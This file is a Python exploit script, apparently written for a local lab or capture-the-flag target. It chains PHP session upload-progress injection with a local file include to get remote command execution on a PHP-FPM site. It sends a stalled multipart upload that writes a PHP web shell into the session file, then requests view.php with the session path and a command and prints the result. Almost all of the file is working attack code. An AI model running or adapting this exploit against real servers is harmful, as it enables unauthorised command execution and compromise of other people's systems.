#!/usr/bin/env python3
"""upload_progress injection -> include sink (Chain A) on FPM.

The stalled multipart upload writes the raw PHP_SESSION_UPLOAD_PROGRESS value
into the session file; view.php?tpl=/tmp/sess_<sid> includes it and executes
the PHP code. Default cleanup is kept on: the upload is held open.

Usage: chain_a_stall.py <port> [cmd]
"""
import os
import socket
import sys
import time

port = int(sys.argv[1]) if len(sys.argv) > 1 else 9001
cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
sid = "chaina" + "".join("%02x" % b for b in os.urandom(10))

# Raw progress value: stored as the session key inside the session file.
payload = "<?php system($_GET['c']); ?>"
boundary = b"----chainA"
prefix = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    + payload.encode() + b"\r\n"
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="f"; filename="t"\r\n'
    b"Content-Type: application/octet-stream\r\n\r\n" + b"Z" * 64
)
total = len(prefix) + 200000

w = socket.create_connection(("127.0.0.1", port), timeout=10)
w.sendall(
    b"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(total).encode() + b"\r\n"
    b"Connection: close\r\n\r\n" + prefix
)
time.sleep(0.8)

r = socket.create_connection(("127.0.0.1", port), timeout=10)
r.sendall(
    b"GET /view.php?tpl=/tmp/sess_" + sid.encode() + b"&c=" + cmd.encode() +
    b" HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
)
resp = b""
try:
    while True:
        c = r.recv(65536)
        if not c:
            break
        resp += c
except socket.timeout:
    pass
r.close()
w.close()
head, _, out = resp.partition(b"\r\n\r\n")
print(head.split(b"\r\n", 1)[0].decode("latin-1"))
print(out.decode("latin-1", "replace")[:2000])
